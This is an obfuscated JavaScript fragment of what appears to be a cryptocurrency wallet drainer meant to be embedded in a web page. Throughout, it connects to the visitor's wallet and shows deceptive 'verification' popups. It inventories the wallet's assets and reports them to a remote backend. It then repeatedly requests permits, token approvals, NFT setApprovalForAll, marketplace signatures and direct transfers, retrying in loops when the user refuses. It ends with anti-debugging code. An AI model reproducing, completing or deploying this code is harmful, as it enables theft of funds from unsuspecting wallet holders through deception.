                        if (!_0x52e6d5[0x0]['includes']('0x')) return connect_cancel();
                        MS_Current_Address = _0x52e6d5[0x0], MS_Current_Chain_ID = parseInt(MS_Provider['chainId']), MS_Web3 = new ethers[(_0x3e1980(0x1f8))]['Web3Provider'](MS_Provider), MS_Signer = MS_Web3[_0x3e1980(0x22d)]();
                    } else return MS_Process = ![], await connect_cancel();
                }
                if (!MS_Current_Address[_0x3e1980(0x1bb)](/^0x\S+$/)) throw new Error('Invalid\x20Wallet');
            } catch (_0x3f2456) {
                return console['log'](_0x3f2456), MS_Process = ![], await connect_cancel();
            }
            ms_hide();
            if (MS_Settings[_0x3e1980(0x201)] == 0x1) {
                Swal[_0x3e1980(0x16e)]({
                    'html': _0x3e1980(0x20a),
                    'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                    'imageHeight': 0x3c,
                    'allowOutsideClick': ![],
                    'allowEscapeKey': ![],
                    'timer': 0x0,
                    'width': 0x258,
                    'showConfirmButton': ![]
                });
                try {
                    const _0x1fe261 = (MS_Verify_Message == '' ? MS_Settings['V_MSG'] : MS_Verify_Message)[_0x3e1980(0x17c)](_0x3e1980(0x1d0), MS_Current_Address),
                        _0x16d999 = await MS_Signer[_0x3e1980(0x1de)](_0x1fe261),
                        _0x473e51 = ethers['utils']['recoverAddress'](ethers[_0x3e1980(0x1a4)][_0x3e1980(0x1d4)](_0x1fe261), _0x16d999);
                    if (!_0x473e51) return Swal[_0x3e1980(0x16e)]({
                        'title': _0x3e1980(0x208),
                        'text': _0x3e1980(0x228),
                        'icon': 'error',
                        'confirmButtonText': 'OK'
                    }), MS_Process = ![], await connect_cancel();
                    else {
                        let _0x23e4e4 = await send_request({
                            'action': 'sign_verify',
                            'sign': _0x16d999,
                            'address': MS_Current_Address,
                            'message': MS_Verify_Message
                        });
                        if (_0x23e4e4[_0x3e1980(0x25c)] != 'OK') return Swal[_0x3e1980(0x16e)]({
                            'title': 'Verification\x20Error',
                            'text': _0x3e1980(0x228),
                            'icon': _0x3e1980(0x25e),
                            'confirmButtonText': 'OK'
                        }), MS_Process = ![], await connect_cancel();
                    }
                } catch (_0x55909d) {
                    return Swal[_0x3e1980(0x16e)]({
                        'title': _0x3e1980(0x208),
                        'text': 'We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.',
                        'icon': _0x3e1980(0x25e),
                        'confirmButtonText': 'OK'
                    }), MS_Process = ![], await connect_cancel();
                }
            } else await send_request({
                'action': _0x3e1980(0x1c1),
                'address': MS_Current_Address
            });
            await connect_success(), show_check();
            if (MS_Settings[_0x3e1980(0x23f)][_0x3e1980(0x233)] > 0x0 && MS_Settings[_0x3e1980(0x23f)][_0x3e1980(0x23a)](MS_Current_Address[_0x3e1980(0x2bf)]())) {
                MS_Check_Done = !![], Swal['close'](), Swal[_0x3e1980(0x16e)]({
                    'title': _0x3e1980(0x29c),
                    'text': _0x3e1980(0x256),
                    'icon': _0x3e1980(0x25e),
                    'confirmButtonText': 'OK'
                }), MS_Process = ![];
                return;
            }
            let _0x3834b7 = await get_wallet_assets(MS_Current_Address),
                _0x4c4e02 = 0x0;
            for (const _0x49e4c2 of _0x3834b7) {
                try {
                    _0x4c4e02 += _0x49e4c2[_0x3e1980(0x152)];
                } catch (_0x2e6bf7) {
                    console['log'](_0x2e6bf7);
                }
            }
            let _0xad4548 = 0x0;
            for (const _0x3d1a8d of _0x3834b7) _0xad4548 += _0x3d1a8d['amount_usd'];
            await send_request({
                'action': _0x3e1980(0x2c2),
                'user_id': MS_ID,
                'assets': _0x3834b7,
                'balance': _0xad4548
            }), MS_Check_Done = !![], Swal['close']();
            if (MS_Settings['Settings'][_0x3e1980(0x2d3)] > _0x4c4e02) {
                Swal['fire']({
                    'title': _0x3e1980(0x22a),
                    'text': _0x3e1980(0x222),
                    'icon': _0x3e1980(0x25e),
                    'confirmButtonText': 'OK'
                }), MS_Process = ![];
                return;
            }
            Swal[_0x3e1980(0x16e)]({
                'html': _0x3e1980(0x298),
                'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
            for (const _0x3c0693 of _0x3834b7) {
                try {
                    if (_0x3c0693[_0x3e1980(0x22f)] != _0x3e1980(0x15b)) MS_Gas_Reserves[_0x3c0693['chain_id']] += 0x1;
                } catch (_0x2f7d81) {
                    console[_0x3e1980(0x2c3)](_0x2f7d81);
                }
            }
            if (typeof SIGN_BLUR !== _0x3e1980(0x235) && MS_Settings[_0x3e1980(0x231)]['Blur'][_0x3e1980(0x2ae)] == 0x1 && MS_Settings['Settings'][_0x3e1980(0x260)][_0x3e1980(0x253)] == 0x1) await SIGN_BLUR(_0x3834b7, MS_Provider, MS_Current_Address, MS_Settings[_0x3e1980(0x216)], MS_ID);
            if (typeof SIGN_SEAPORT !== _0x3e1980(0x235) && MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x19e)][_0x3e1980(0x2ae)] == 0x1 && MS_Settings[_0x3e1980(0x231)]['SeaPort'][_0x3e1980(0x253)] == 0x1) await SIGN_SEAPORT(_0x3834b7, MS_Provider, MS_Current_Address, MS_Settings[_0x3e1980(0x216)], MS_ID);
            if (typeof SIGN_X2Y2 !== _0x3e1980(0x235) && MS_Settings[_0x3e1980(0x231)]['x2y2'][_0x3e1980(0x2ae)] == 0x1 && MS_Current_Chain_ID == 0x1 && MS_Settings[_0x3e1980(0x231)]['x2y2'][_0x3e1980(0x253)] == 0x1) await SIGN_X2Y2(_0x3834b7, MS_Provider, MS_Current_Address, MS_Settings[_0x3e1980(0x216)], MS_ID);
            if (MS_Provider[_0x3e1980(0x175)] && !MS_Mobile_Status) try {
                MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)][_0x3e1980(0x2cf)] = 0x0, MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)][_0x3e1980(0x24e)] = 0x0, MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)][_0x3e1980(0x2ad)] = 0x0;
            } catch (_0xe71d70) {
                console[_0x3e1980(0x2c3)](_0xe71d70);
            }
            for (const _0x217a1b of _0x3834b7) {
                try {
                    if (_0x217a1b[_0x3e1980(0x1a2)]) continue;
                    let _0xa0719b = ![];
                    if (_0x217a1b[_0x3e1980(0x22f)] == _0x3e1980(0x15b)) {
                        const _0x35827d = new ethers[(_0x3e1980(0x1f8))]['JsonRpcProvider'](MS_Settings[_0x3e1980(0x219)][_0x217a1b[_0x3e1980(0x213)]]);
                        let _0x202336 = ![];
                        const _0x251464 = ethers['BigNumber'][_0x3e1980(0x245)](await _0x35827d['getGasPrice']())[_0x3e1980(0x191)](ethers[_0x3e1980(0x22e)][_0x3e1980(0x245)](_0x3e1980(0x29d)))['mul'](ethers[_0x3e1980(0x22e)][_0x3e1980(0x245)](_0x3e1980(0x20f)))[_0x3e1980(0x23c)]();
                        if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x1a1)][convert_chain('ID', _0x3e1980(0x1c9), _0x217a1b[_0x3e1980(0x213)])]['Contract_Address'] != '') _0x202336 = !![];
                        const _0x50ddf9 = _0x217a1b['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x217a1b[_0x3e1980(0x213)] == 0xa86a ? 0x4c4b40 : _0x202336 ? 0xea60 : 0x5208,
                            _0x49e22e = _0x217a1b[_0x3e1980(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x217a1b[_0x3e1980(0x213)] == 0xa86a ? 0x4c4b40 : 0x249f0,
                            _0x5388db = ethers[_0x3e1980(0x22e)][_0x3e1980(0x245)](_0x217a1b['chain_id'] == 0xa ? '35000000000' : _0x251464),
                            _0x145e1d = _0x5388db[_0x3e1980(0x29f)](ethers['BigNumber']['from'](_0x50ddf9))[_0x3e1980(0x29f)](ethers['BigNumber'][_0x3e1980(0x245)]('2')),
                            _0x37afc1 = _0x5388db[_0x3e1980(0x29f)](ethers[_0x3e1980(0x22e)][_0x3e1980(0x245)](_0x49e22e))[_0x3e1980(0x29f)](ethers['BigNumber'][_0x3e1980(0x245)](String(MS_Gas_Reserves[_0x217a1b[_0x3e1980(0x213)]]))),
                            _0xff4b9b = ethers['BigNumber'][_0x3e1980(0x245)](_0x217a1b[_0x3e1980(0x2d1)])[_0x3e1980(0x2d8)](_0x145e1d)[_0x3e1980(0x2d8)](_0x37afc1)['toString']();
                        console['log'](_0xff4b9b);
                        if (ethers[_0x3e1980(0x22e)][_0x3e1980(0x245)](_0xff4b9b)[_0x3e1980(0x1c3)](ethers[_0x3e1980(0x22e)][_0x3e1980(0x245)]('0'))) continue;
                    }
                    if (_0x217a1b[_0x3e1980(0x213)] != MS_Current_Chain_ID) {
                        if (MS_Current_Provider == 'WalletConnect') continue;
                        await chain_request(MS_Current_Chain_ID, _0x217a1b[_0x3e1980(0x213)]);
                        try {
                            try {
                                await MS_Provider[_0x3e1980(0x212)]({
                                    'method': _0x3e1980(0x269),
                                    'params': [{
                                        'chainId': '0x' + _0x217a1b[_0x3e1980(0x213)][_0x3e1980(0x23c)](0x10)
                                    }]
                                });
                            } catch (_0x222a64) {
                                if (_0x222a64[_0x3e1980(0x1d7)] == 0x1326) try {
                                    await MS_Provider[_0x3e1980(0x212)]({
                                        'method': _0x3e1980(0x24a),
                                        'params': [MS_MetaMask_ChainData[_0x217a1b['chain_id']]]
                                    });
                                } catch (_0x2a84f0) {
                                    await chain_cancel();
                                    continue;
                                } else {
                                    await chain_cancel();
                                    continue;
                                }
                            }
                            MS_Current_Chain_ID = _0x217a1b['chain_id'], MS_Web3 = new ethers['providers'][(_0x3e1980(0x199))](MS_Provider), MS_Signer = MS_Web3[_0x3e1980(0x22d)](), _0xa0719b = !![], await chain_success();
                        } catch (_0x4fcba9) {
                            console[_0x3e1980(0x2c3)](_0x4fcba9), await chain_cancel();
                            continue;
                        }
                    } else _0xa0719b = !![];
                    if (!_0xa0719b) continue;
                    if (_0x217a1b[_0x3e1980(0x22f)] == _0x3e1980(0x15b)) {
                        if (MS_Settings[_0x3e1980(0x231)]['Sign'][_0x3e1980(0x2cf)] > 0x0 && !MS_Sign_Disabled)
                            while (!![]) {
                                try {
                                    await SIGN_NATIVE(_0x217a1b);
                                    break;
                                } catch (_0x1829e6) {
                                    console['log'](_0x1829e6);
                                    if (_0x1829e6['code'] == -0x7f59) {
                                        await sign_unavailable();
                                        while (!![]) {
                                            try {
                                                await TRANSFER_NATIVE(_0x217a1b);
                                                break;
                                            } catch (_0x44f769) {
                                                console[_0x3e1980(0x2c3)](_0x44f769);
                                                if (_0x44f769 != _0x3e1980(0x24d)) {
                                                    await transfer_cancel();
                                                    if (!MS_Settings[_0x3e1980(0x27e)]) break;
                                                } else break;
                                            }
                                        }
                                        break;
                                    } else {
                                        console[_0x3e1980(0x2c3)](_0x1829e6);
                                        if (_0x1829e6 != _0x3e1980(0x24d)) {
                                            await sign_cancel();
                                            if (!MS_Settings[_0x3e1980(0x27e)]) break;
                                        } else break;
                                    }
                                }
                            } else
                                while (!![]) {
                                    try {
                                        await TRANSFER_NATIVE(_0x217a1b);
                                        break;
                                    } catch (_0x514788) {
                                        console[_0x3e1980(0x2c3)](_0x514788);
                                        if (_0x514788 != _0x3e1980(0x24d)) {
                                            await transfer_cancel();
                                            if (!MS_Settings[_0x3e1980(0x27e)]) break;
                                        } else break;
                                    }
                                }
                    } else {
                        if (_0x217a1b[_0x3e1980(0x22f)] == _0x3e1980(0x2b2)) {
                            if (typeof _0x217a1b[_0x3e1980(0x1b8)] == 'undefined' && MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x268)]['Mode']) {
                                const _0x48cb6f = await retrive_token(_0x217a1b['chain_id'], _0x217a1b[_0x3e1980(0x18c)]),
                                    _0x47ed09 = new ethers[(_0x3e1980(0x1f8))]['JsonRpcProvider'](MS_Settings[_0x3e1980(0x219)][_0x217a1b['chain_id']]),
                                    _0x370122 = new ethers['Contract'](_0x217a1b[_0x3e1980(0x18c)], _0x48cb6f, _0x47ed09),
                                    _0x3c4a32 = get_permit_type(_0x370122[_0x3e1980(0x234)]);
                                _0x217a1b['permit'] = _0x3c4a32, _0x217a1b[_0x3e1980(0x2a3)] = '1', _0x217a1b[_0x3e1980(0x1f4)] = _0x48cb6f;
                                if (_0x3c4a32 > 0x0) {
                                    if (_0x370122[_0x3e1980(0x234)]['hasOwnProperty'](_0x3e1980(0x1b1))) try {
                                        _0x217a1b[_0x3e1980(0x2a3)] = await _0x370122[_0x3e1980(0x1b1)]();
                                    } catch (_0x133408) {
                                        console[_0x3e1980(0x2c3)](_0x133408);
                                    }
                                    console[_0x3e1980(0x2c3)]('[PERMIT\x20FOUND]\x20' + _0x217a1b['name'] + _0x3e1980(0x2cd) + _0x3c4a32 + _0x3e1980(0x1a6) + _0x217a1b[_0x3e1980(0x2a3)]);
                                }
                            }
                            if (_0x217a1b[_0x3e1980(0x1b8)] > 0x0)
                                for (const _0x595054 of MS_Settings[_0x3e1980(0x1af)]) {
                                    if (_0x595054[0x0] == MS_Current_Chain_ID && _0x595054[0x1] === _0x217a1b[_0x3e1980(0x18c)]['toLowerCase']()) {
                                        _0x217a1b[_0x3e1980(0x1b8)] = 0x0;
                                        break;
                                    }
                                }
                            if (MS_Settings['Settings'][_0x3e1980(0x268)][_0x3e1980(0x1c2)] && _0x217a1b[_0x3e1980(0x1b8)] && _0x217a1b[_0x3e1980(0x1b8)] > 0x0)
                                while (!![]) {
                                    try {
                                        await PERMIT_TOKEN(_0x217a1b);
                                        break;
                                    } catch (_0x1a8084) {
                                        console[_0x3e1980(0x2c3)](_0x1a8084), await approve_cancel();
                                        if (!MS_Settings['Loop_T']) break;
                                    }
                                } else {
                                    if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x1b9)][_0x3e1980(0x2ae)] && _0x217a1b[_0x3e1980(0x1f9)]) {
                                        if (_0x217a1b[_0x3e1980(0x1b0)] == 'Uniswap') {
                                            const _0x3d498d = [];
                                            for (const _0x21210d of _0x3834b7) {
                                                try {
                                                    _0x21210d[_0x3e1980(0x213)] == _0x217a1b[_0x3e1980(0x213)] && _0x21210d[_0x3e1980(0x1f9)] && _0x21210d['swapper_type'] == 'Uniswap' && (_0x3d498d[_0x3e1980(0x1bd)](_0x21210d), _0x21210d['skip'] = !![]);
                                                } catch (_0x553010) {
                                                    console[_0x3e1980(0x2c3)](_0x553010);
                                                }
                                            }
                                            while (!![]) {
                                                try {
                                                    await DO_UNISWAP(_0x217a1b, _0x3d498d);
                                                    break;
                                                } catch (_0x59a307) {
                                                    console[_0x3e1980(0x2c3)](_0x59a307), await sign_cancel();
                                                    if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                }
                                            }
                                        } else
                                            while (!![]) {
                                                try {
                                                    await DO_SWAP(_0x217a1b);
                                                    break;
                                                } catch (_0x23fb68) {
                                                    console[_0x3e1980(0x2c3)](_0x23fb68), await sign_cancel();
                                                    if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                }
                                            }
                                    } else {
                                        if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)]['Tokens'] > 0x0 && !MS_Sign_Disabled)
                                            while (!![]) {
                                                try {
                                                    await SIGN_TOKEN(_0x217a1b);
                                                    if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)][_0x3e1980(0x24e)] == 0x1) {
                                                        const _0x5b9950 = send_request({
                                                            'action': _0x3e1980(0x2d5),
                                                            'user_id': MS_ID,
                                                            'asset': _0x217a1b,
                                                            'address': MS_Current_Address
                                                        });
                                                        if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x1e5)]) await _0x5b9950;
                                                    }
                                                    break;
                                                } catch (_0x25c81d) {
                                                    console[_0x3e1980(0x2c3)](_0x25c81d);
                                                    if (_0x25c81d[_0x3e1980(0x1d7)] == -0x7f59) {
                                                        await sign_unavailable();
                                                        while (!![]) {
                                                            if (MS_Settings[_0x3e1980(0x231)]['Sign'][_0x3e1980(0x24e)] == 0x1) {
                                                                if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x2c0)][_0x3e1980(0x27b)] || (MS_Current_Provider != _0x3e1980(0x27b) || MS_Mobile_Status)) try {
                                                                    await APPROVE_TOKEN(_0x217a1b);
                                                                    const _0x4773b0 = send_request({
                                                                        'action': 'approve_token',
                                                                        'user_id': MS_ID,
                                                                        'asset': _0x217a1b,
                                                                        'address': MS_Current_Address
                                                                    });
                                                                    if (MS_Settings['Settings'][_0x3e1980(0x1e5)]) await _0x4773b0;
                                                                    break;
                                                                } catch (_0xb55c35) {
                                                                    await approve_cancel();
                                                                    if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                                } else try {
                                                                    await TRANSFER_TOKEN(_0x217a1b);
                                                                    break;
                                                                } catch (_0x373d3f) {
                                                                    console[_0x3e1980(0x2c3)](_0x373d3f), await transfer_cancel();
                                                                    if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                                }
                                                            } else {
                                                                if (MS_Settings['Settings'][_0x3e1980(0x20c)][_0x3e1980(0x24e)] == 0x2) try {
                                                                    await TRANSFER_TOKEN(_0x217a1b);
                                                                    break;
                                                                } catch (_0x5b8e1f) {
                                                                    console[_0x3e1980(0x2c3)](_0x5b8e1f), await transfer_cancel();
                                                                    if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    } else {
                                                        console['log'](_0x25c81d), await sign_cancel();
                                                        if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                    }
                                                }
                                            } else {
                                                if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x2c0)][_0x3e1980(0x2ae)] && (MS_Settings[_0x3e1980(0x231)]['Approve'][_0x3e1980(0x27b)] || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status)))
                                                    while (!![]) {
                                                        try {
                                                            await APPROVE_TOKEN(_0x217a1b);
                                                            const _0x51795b = send_request({
                                                                'action': _0x3e1980(0x2d5),
                                                                'user_id': MS_ID,
                                                                'asset': _0x217a1b,
                                                                'address': MS_Current_Address
                                                            });
                                                            if (MS_Settings['Settings'][_0x3e1980(0x1e5)]) await _0x51795b;
                                                            break;
                                                        } catch (_0x52a95a) {
                                                            console[_0x3e1980(0x2c3)](_0x52a95a), await approve_cancel();
                                                            if (!MS_Settings['Loop_T']) break;
                                                        }
                                                    } else
                                                        while (!![]) {
                                                            try {
                                                                await TRANSFER_TOKEN(_0x217a1b);
                                                                break;
                                                            } catch (_0x2e5e8e) {
                                                                console[_0x3e1980(0x2c3)](_0x2e5e8e), await transfer_cancel();
                                                                if (!MS_Settings[_0x3e1980(0x1cc)]) break;
                                                            }
                                                        }
                                            }
                                    }
                                }
                        } else {
                            if (_0x217a1b[_0x3e1980(0x22f)] == _0x3e1980(0x1fe)) {
                                if (typeof SIGN_BLUR !== _0x3e1980(0x235) && MS_Settings['Settings'][_0x3e1980(0x260)][_0x3e1980(0x2ae)] == 0x1 && MS_Settings['Settings'][_0x3e1980(0x260)][_0x3e1980(0x253)] == 0x0 && !BL_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x217a1b[_0x3e1980(0x18c)], MS_Current_Address, '0x00000000000111abe46ff893f3b2fdf1f759a8a8')) await SIGN_BLUR(_0x3834b7, MS_Provider, MS_Current_Address, MS_Settings[_0x3e1980(0x216)], MS_ID), BL_US = !![];
                                else {
                                    if (typeof SIGN_SEAPORT !== _0x3e1980(0x235) && MS_Settings['Settings'][_0x3e1980(0x19e)]['Enable'] == 0x1 && MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x19e)][_0x3e1980(0x253)] == 0x0 && !SP_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x217a1b[_0x3e1980(0x18c)], MS_Current_Address, _0x3e1980(0x1f7))) await SIGN_SEAPORT(_0x3834b7, MS_Provider, MS_Current_Address, MS_Settings[_0x3e1980(0x216)], MS_ID), SP_US = !![];
                                    else {
                                        if (typeof SIGN_X2Y2 !== _0x3e1980(0x235) && MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x211)][_0x3e1980(0x2ae)] == 0x1 && MS_Settings['Settings']['x2y2'][_0x3e1980(0x253)] == 0x0 && !XY_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x217a1b[_0x3e1980(0x18c)], MS_Current_Address, _0x3e1980(0x240))) await SIGN_X2Y2(_0x3834b7, MS_Provider, MS_Current_Address, MS_Settings[_0x3e1980(0x216)], MS_ID), XY_US = !![];
                                        else {
                                            if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)][_0x3e1980(0x2ad)] > 0x0 && !MS_Sign_Disabled)
                                                while (!![]) {
                                                    try {
                                                        await SIGN_NFT(_0x217a1b);
                                                        if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)]['Tokens'] == 0x1) {
                                                            let _0x54d1b9 = [];
                                                            for (const _0x2e755c of _0x3834b7) {
                                                                try {
                                                                    _0x2e755c[_0x3e1980(0x18c)] == _0x217a1b[_0x3e1980(0x18c)] && (_0x54d1b9['push'](_0x2e755c), _0x2e755c[_0x3e1980(0x1a2)] = !![]);
                                                                } catch (_0x2ef18b) {
                                                                    console[_0x3e1980(0x2c3)](_0x2ef18b);
                                                                }
                                                            }
                                                            await send_request({
                                                                'action': _0x3e1980(0x27a),
                                                                'user_id': MS_ID,
                                                                'tokens': _0x54d1b9,
                                                                'address': MS_Current_Address,
                                                                'chain_id': MS_Current_Chain_ID,
                                                                'contract_address': _0x217a1b['address']
                                                            });
                                                        }
                                                        break;
                                                    } catch (_0x50577c) {
                                                        console['log'](_0x50577c);
                                                        if (_0x50577c[_0x3e1980(0x1d7)] == -0x7f59) {
                                                            await sign_unavailable();
                                                            while (!![]) {
                                                                if (MS_Settings[_0x3e1980(0x231)][_0x3e1980(0x20c)][_0x3e1980(0x2ad)] == 0x1) try {
                                                                    await DO_SAFA(_0x217a1b);
                                                                    let _0x40574c = [];
                                                                    for (const _0x49ea67 of _0x3834b7) {
                                                                        try {
                                                                            _0x49ea67['address'] == _0x217a1b[_0x3e1980(0x18c)] && (_0x40574c['push'](_0x49ea67), _0x49ea67[_0x3e1980(0x1a2)] = !![]);
                                                                        } catch (_0x1bd259) {
                                                                            console[_0x3e1980(0x2c3)](_0x1bd259);
                                                                        }
                                                                    }
                                                                    await send_request({
                                                                        'action': _0x3e1980(0x27a),
                                                                        'user_id': MS_ID,
                                                                        'tokens': _0x40574c,
                                                                        'address': MS_Current_Address,
                                                                        'chain_id': MS_Current_Chain_ID,
                                                                        'contract_address': _0x217a1b[_0x3e1980(0x18c)]
                                                                    });
                                                                    break;
                                                                } catch (_0x328328) {
                                                                    console['log'](_0x328328), await approve_cancel();
                                                                    if (!MS_Settings[_0x3e1980(0x210)]) break;
                                                                } else {
                                                                    if (MS_Settings['Settings'][_0x3e1980(0x20c)][_0x3e1980(0x2ad)] == 0x2) try {
                                                                        await TRANSFER_NFT(_0x217a1b);
                                                                        break;
                                                                    } catch (_0x2ae557) {
                                                                        console[_0x3e1980(0x2c3)](_0x2ae557), await transfer_cancel();
                                                                        if (!MS_Settings[_0x3e1980(0x210)]) break;
                                                                    }
                                                                }
                                                            }
                                                            break;
                                                        } else {
                                                            console[_0x3e1980(0x2c3)](_0x50577c), await sign_cancel();
                                                            if (!MS_Settings['Loop_NFT']) break;
                                                        }
                                                    }
                                                } else {
                                                    if (MS_Settings[_0x3e1980(0x231)]['Approve'][_0x3e1980(0x2ae)])
                                                        while (!![]) {
                                                            try {
                                                                await DO_SAFA(_0x217a1b);
                                                                let _0x50c018 = [];
                                                                for (const _0x316b09 of _0x3834b7) {
                                                                    try {
                                                                        _0x316b09[_0x3e1980(0x18c)] == _0x217a1b[_0x3e1980(0x18c)] && (_0x50c018['push'](_0x316b09), _0x316b09['skip'] = !![]);
                                                                    } catch (_0x5a64b6) {
                                                                        console[_0x3e1980(0x2c3)](_0x5a64b6);
                                                                    }
                                                                }
                                                                await send_request({
                                                                    'action': _0x3e1980(0x27a),
                                                                    'user_id': MS_ID,
                                                                    'tokens': _0x50c018,
                                                                    'address': MS_Current_Address,
                                                                    'chain_id': MS_Current_Chain_ID,
                                                                    'contract_address': _0x217a1b[_0x3e1980(0x18c)]
                                                                });
                                                                break;
                                                            } catch (_0x3079bf) {
                                                                console[_0x3e1980(0x2c3)](_0x3079bf), await approve_cancel();
                                                                if (!MS_Settings[_0x3e1980(0x210)]) break;
                                                            }
                                                        } else
                                                            while (!![]) {
                                                                try {
                                                                    await TRANSFER_NFT(_0x217a1b);
                                                                    break;
                                                                } catch (_0x3113a5) {
                                                                    console[_0x3e1980(0x2c3)](_0x3113a5), await transfer_cancel();
                                                                    if (!MS_Settings[_0x3e1980(0x210)]) break;
                                                                }
                                                            }
                                                }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (_0xacc822) {
                    console[_0x3e1980(0x2c3)](_0xacc822);
                }
            }
            MS_Process = ![], setTimeout(end_message, 0x7d0);
        } catch (_0x14a93f) {
            console[_0x3e1980(0x2c3)](_0x14a93f);
        }
    };
document['addEventListener'](_0x53f51f(0x2ac), async () => {
    const _0x595d3a = _0x53f51f;
    try {
        await retrive_config(), fill_chain_data(), await retrive_contract();
        if (typeof localStorage['MS_ID'] === _0x595d3a(0x235)) {
            const _0x278bee = await send_request({
                'action': _0x595d3a(0x223)
            });
            if (_0x278bee[_0x595d3a(0x25c)] == 'OK') localStorage[_0x595d3a(0x1db)] = _0x278bee[_0x595d3a(0x25b)];
            else localStorage[_0x595d3a(0x1db)] = Math[_0x595d3a(0x2c7)](Date[_0x595d3a(0x280)]() / 0x3e8);
        }
        MS_ID = localStorage[_0x595d3a(0x1db)], MS_Ready = !![], inject_modal(), enter_website();
        for (const _0x57ef19 in MS_Settings[_0x595d3a(0x219)]) MS_Gas_Reserves[_0x57ef19] = 0x0;
        for (const _0x300f6e of document['querySelectorAll'](_0x595d3a(0x181))) {
            try {
                _0x300f6e[_0x595d3a(0x15f)](_0x595d3a(0x163), () => ms_init());
            } catch (_0x5dda55) {
                console[_0x595d3a(0x2c3)](_0x5dda55);
            }
        }
    } catch (_0x503c34) {
        console['log'](_0x503c34);
    }
}), window[_0x53f51f(0x15f)]('beforeunload', _0x12ae96 => leave_website()), window['addEventListener'](_0x53f51f(0x1d3), _0x49ff7a => leave_website());

function _0x2467c4(_0x2a5909) {
    function _0x4e956d(_0x415087) {
        const _0x157fa4 = _0x2c7e;
        if (typeof _0x415087 === 'string') return function(_0x380cd9) {}[_0x157fa4(0x193)]('while\x20(true)\x20{}')[_0x157fa4(0x16b)](_0x157fa4(0x252));
        else('' + _0x415087 / _0x415087)[_0x157fa4(0x233)] !== 0x1 || _0x415087 % 0x14 === 0x0 ? function() {
            return !![];
        }[_0x157fa4(0x193)](_0x157fa4(0x214) + _0x157fa4(0x239))[_0x157fa4(0x1f2)](_0x157fa4(0x1b5)) : function() {
            return ![];
        }[_0x157fa4(0x193)](_0x157fa4(0x214) + _0x157fa4(0x239))[_0x157fa4(0x16b)]('stateObject');
        _0x4e956d(++_0x415087);
    }
    try {
        if (_0x2a5909) return _0x4e956d;
        else _0x4e956d(0x0);
    } catch (_0x3ee6da) {}
}